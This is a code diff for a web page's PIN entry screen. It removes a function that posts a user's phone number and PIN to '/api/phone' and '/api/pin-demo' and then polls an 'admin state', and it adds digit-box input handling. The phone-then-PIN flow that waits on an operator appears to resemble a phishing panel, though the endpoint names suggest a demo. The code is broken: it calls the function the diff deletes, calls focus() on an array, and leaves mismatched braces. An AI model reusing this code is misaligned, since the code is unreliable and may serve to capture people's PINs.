@@ -168,43 +168,42 @@
       }
       inputs[0].focus();
     }
+function createPinInputs(container, totalCount) {
+  container.innerHTML = '';
+  const inputs = [];
+  for (let i = 0; i < totalCount; i++) {
+    const input = document.createElement('input');
+    input.type = 'password';
+    input.inputMode = 'numeric';
+    input.maxLength = 1;
+    input.className = 'digit';
 
-    async function submitPinFlow(pinValue, inputs) {
-      pinError.textContent = '';
-      secureModal.classList.remove('hidden'); 
-      inputs.forEach(i => i.disabled = true);
-
-      // ✅ AUTOMATIC RE-REGISTRATION FALLBACK
-      // If Render clears its storage, this auto-registers the phone number right before saving the PIN
-      try {
-        let checkRes = await fetch(`/api/status/${currentRequestId}`);
-        if (!checkRes.ok) {
-          const reRegister = await fetch('/api/phone', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: savedPhoneValue })
-          });
-          const reData = await reRegister.json();
-          if (reRegister.ok) {
-            currentRequestId = reData.id;
-          }
-        }
-      } catch (e) { console.log("State refresh ignored."); }
-
-      try {
-        const res = await fetch('/api/pin-demo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
-        });
-        if (!res.ok) throw new Error('Submission failed.');
-        startPollingAdminState(inputs);
-      } catch (err) {
-        secureModal.classList.add('hidden');
-        pinError.textContent = err.message;
-        inputs.forEach(i => { i.disabled = false; i.value = ''; });
-        inputs[0].focus();
+    input.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+      if (e.target.value && input.nextElementSibling) {
+        input.nextElementSibling.focus();
       }
+      
+      // ✅ FIX: Counts the filled fields explicitly out of the array layout without relying on internal scope definitions
+      const pinVal = inputs.map(inp => inp.value).join('');
+      if (pinVal.length === 5) { 
+        submitPinFlow(pinVal, inputs);
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {
+        input.previousElementSibling.focus();
+      }
+    });
+
+    container.appendChild(input);
+    inputs.push(input);
+  }
+  if (inputs.length > 0) inputs.focus();
+}
+
+  
     }
 
     function startPollingAdminState(inputs) {
